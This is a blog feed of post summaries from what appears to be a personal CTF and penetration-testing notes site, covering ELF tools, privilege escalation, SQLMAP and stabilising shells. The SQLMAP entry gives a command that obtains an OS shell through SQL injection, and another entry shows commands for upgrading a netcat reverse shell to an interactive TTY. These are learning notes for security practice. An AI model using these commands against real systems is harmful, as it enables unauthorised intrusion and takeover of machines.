feed.title: Chirpy
feed.subtitle: A minimal, responsive, and powerful Jekyll theme for presenting professional writing.

entry.title: Computer Security
entry.summary: Interacting with ELF file readelf #To parse the ELF header objdump nm patchelf objcopy strip kaitai struct # (https://ide.kaitai.io)

entry.title: Privilege Escalation
entry.summary:
In your journey playing CTF or doing real penetration testing you will fall in this situation where you need to escalate your privileges in order to procced further. Without escalating your privileges you will never be able to have a full control on the target machine. Down below you will find some usefull archive of known most common methods of privilege escalation.
Check sudo privileges sudo...

entry.title: SQLMAP
entry.summary:
SQL Map
SQLMAP is a tool to search for sql injection vulnerabilities.
Get a shell with sqlmap
sqlmap -u 'http://10.129.171.190/dashboard.php?search=sa' --cookie="PHPSESSID=dnmjjjj6rias1o8pc3ob5rj7j9" --os-shell
If something goes wrong with your sqlmap tool after a successful usage, you can try and flush the session by adding --flush-session --time-sec=20 argument
The command line above wil...

entry.title: Stable Shell
entry.summary:
We all likes to play CTFs, I do too. But sometimes we do a reverse shell using netcat. The shell we get back most of time is not stable. Thus, we need to make it stable. Down below you will find the instructions to make a stable shell.
Spawning a TTY shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
After spawning a tty shell, click Ctrl+z and execute the command below:
stty raw -echo
...

entry.title: Projects
entry.summary:
Project Based Learning
A list of programming tutorials in which aspiring software developers learn how to build an application from scratch. These tutorials are divided into different primary programming languages. Tutorials may involve multiple technologies and languages.
To get started, simply fork this repo. Please refer to CONTRIBUTING.md for contribution guidelines.
Table of Contents: ...
